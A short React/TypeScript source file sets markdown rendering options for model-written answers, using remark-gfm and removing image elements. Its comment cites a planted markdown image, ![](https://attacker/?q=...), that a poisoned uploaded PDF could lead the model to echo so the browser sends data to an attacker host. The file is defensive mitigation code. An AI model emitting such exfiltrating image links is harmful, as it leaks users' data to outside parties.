// Shared ReactMarkdown props for model-written answers. Images are dropped: an answer could
// echo an uploaded PDF's planted ![](https://attacker/?q=...) and the browser would fetch it.
// Raw HTML is already escaped by react-markdown (no rehype-raw).
import remarkGfm from 'remark-gfm';

export const MD_PROPS = { remarkPlugins: [remarkGfm], disallowedElements: ['img'] };
